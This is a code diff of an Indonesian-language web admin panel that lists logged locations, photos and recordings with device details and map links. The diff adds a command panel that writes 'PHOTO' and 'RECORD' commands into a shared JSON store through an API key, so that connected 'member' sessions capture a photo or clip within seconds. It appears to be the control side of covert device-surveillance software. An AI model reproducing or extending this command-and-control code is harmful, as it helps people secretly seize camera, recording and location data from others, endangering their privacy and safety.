@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Foto, Rekaman & Lokasi</title>
+    <title>Admin Panel - Kontrol Foto & Rekaman</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; padding: 20px; }
-        .container { max-width: 940px; margin: 0 auto; }
+        .container { max-width: 960px; margin: 0 auto; }
 
         #loginScreen {
             max-width: 360px;
@@ -28,19 +28,31 @@
         #dashboard { display: none; }
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            flex-wrap: wrap; gap: 12px; margin-bottom: 24px;
+            flex-wrap: wrap; gap: 12px; margin-bottom: 18px;
             padding-bottom: 16px; border-bottom: 1px solid #334155;
         }
         .header h1 { font-size: 22px; }
-        .actions { display: flex; gap: 10px; }
+        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
         button {
-            padding: 10px 16px; border: none; border-radius: 8px;
+            padding: 10px 15px; border: none; border-radius: 8px;
             font-weight: 600; cursor: pointer; font-size: 13px;
         }
         .btn-primary { background: #3b82f6; color: white; }
         .btn-primary:hover { background: #2563eb; }
-        .btn-danger { background: #ef4444; color: white; }
-        .btn-danger:hover { background: #dc2626; }
+        .btn-photo { background: #10b981; color: white; }
+        .btn-photo:hover { background: #059669; }
+        .btn-rec { background: #ef4444; color: white; }
+        .btn-rec:hover { background: #dc2626; }
+        .btn-danger { background: #7f1d1d; color: #fecaca; }
+        .btn-danger:hover { background: #991b1b; }
+
+        .cmd-panel {
+            background: #1e293b; border: 1px solid #334155;
+            border-radius: 12px; padding: 16px; margin-bottom: 22px;
+        }
+        .cmd-panel h2 { font-size: 15px; margin-bottom: 10px; }
+        .cmd-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+        .cmd-status { font-size: 12px; color: #94a3b8; margin-top: 10px; }
 
         .log-grid { display: grid; gap: 16px; }
         .log-card {
@@ -55,19 +67,14 @@
             border: 1px solid #475569; background: #0f172a;
             overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
-        .media-box img, .media-box video {
-            width: 100%; height: 100%; object-fit: cover;
-        }
+        .media-box img, .media-box video { width: 100%; height: 100%; object-fit: cover; }
         .log-info h3 { font-size: 16px; color: #fff; margin-bottom: 6px; }
         .log-info p { font-size: 13px; color: #94a3b8; margin-bottom: 4px; }
         .badge {
             display: inline-block; background: rgba(59, 130, 246, 0.15);
             color: #60a5fa; padding: 3px 8px; border-radius: 6px; font-size: 11px; margin-left: 4px;
         }
-        .badge-rec {
-            background: rgba(239, 68, 68, 0.18);
-            color: #f87171;
-        }
+        .badge-rec { background: rgba(239, 68, 68, 0.18); color: #f87171; }
         .device-info { font-size: 11px !important; color: #64748b !important; max-width: 440px; word-break: break-all; }
         .card-actions { display: flex; flex-direction: column; gap: 8px; min-width: 165px; }
         .btn-map, .btn-dl {
@@ -75,8 +82,8 @@
             padding: 9px 14px; border-radius: 8px; font-size: 12px; font-weight: 600;
             display: inline-block;
         }
-        .btn-map { background: #10b981; }
-        .btn-map:hover { background: #059669; }
+        .btn-map { background: #0ea5e9; }
+        .btn-map:hover { background: #0284c7; }
         .btn-dl { background: #475569; }
         .btn-dl:hover { background: #334155; }
         .empty-state { text-align: center; padding: 40px; color: #64748b; }
@@ -94,13 +101,22 @@
     <div id="dashboard">
         <div class="header">
             <div>
-                <h1>📍📷 Log Lokasi, Foto & Rekaman</h1>
-                <p style="font-size: 13px; color: #94a3b8; margin-top: 4px;">Total tercatat: <span id="totalCount">0</span></p>
+                <h1>📍📷 Kontrol & Log Sesi</h1>
+                <p style="font-size: 13px; color: #94a3b8; margin-top: 4px;">Total hasil masuk: <span id="totalCount">0</span></p>
             </div>
             <div class="actions">
                 <button class="btn-primary" onclick="loadLogs()">🔄 Refresh Data</button>
                 <button class="btn-danger" onclick="clearLogs()">🗑️ Hapus Semua</button>
             </div>
+        </div>
+
+        <div class="cmd-panel">
+            <h2>Kirim Perintah ke Sesi Member Aktif</h2>
+            <div class="cmd-row">
+                <button class="btn-photo" onclick="sendCommand('PHOTO')">📸 Perintah Ambil Foto</button>
+                <button class="btn-rec" onclick="sendCommand('RECORD')">🎥 Perintah Rekam Klip (4d)</button>
+            </div>
+            <div id="cmdStatus" class="cmd-status">Status perintah: Belum ada perintah aktif.</div>
         </div>
 
         <div id="logContainer" class="log-grid">
@@ -122,6 +138,43 @@
             loadLogs();
         } else {
             alert("PIN salah!");
+        }
+    }
+
+    async function sendCommand(actionType) {
+        const cmdStatus = document.getElementById('cmdStatus');
+        cmdStatus.textContent = "Mengirim perintah...";
+
+        try {
+            const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`);
+            let currentData = { logs: [] };
+            if (getRes.ok) {
+                const parsed = await getRes.json();
+                currentData = {
+                    logs: Array.isArray(parsed.logs) ? parsed.logs : [],
+                    command: parsed.command || {}
+                };
+            }
+
+            currentData.command = {
+                action: actionType,
+                targetSessionId: null,
+                token: "cmd_" + Date.now() + "_" + Math.random().toString(36).slice(2, 6)
+            };
+
+            const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
+            const putRes = await fetch(putUrl, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(currentData)
+            });
+
+            if (!putRes.ok) throw new Error("Gagal mengirim perintah");
+
+            cmdStatus.textContent = `Perintah ${actionType} terkirim. Member akan mengeksekusi dalam ~5 detik lalu klik Refresh Data.`;
+        } catch (err) {
+            cmdStatus.textContent = "Gagal mengirim perintah.";
+            console.error(err);
         }
     }
 
@@ -194,11 +247,18 @@
     async function clearLogs() {
         if (!confirm("Yakin ingin menghapus seluruh riwayat?")) return;
         try {
+            const getRes = await fetch(`${JSON_URL}?t=${Date.now()}`);
+            let currentCmd = { action: "NONE", targetSessionId: null, token: null };
+            if (getRes.ok) {
+                const parsed = await getRes.json();
+                if (parsed && parsed.command) currentCmd = parsed.command;
+            }
+
             const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
             const res = await fetch(putUrl, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ logs: [] })
+                body: JSON.stringify({ logs: [], command: currentCmd })
             });
             if (res.ok) {
                 loadLogs();
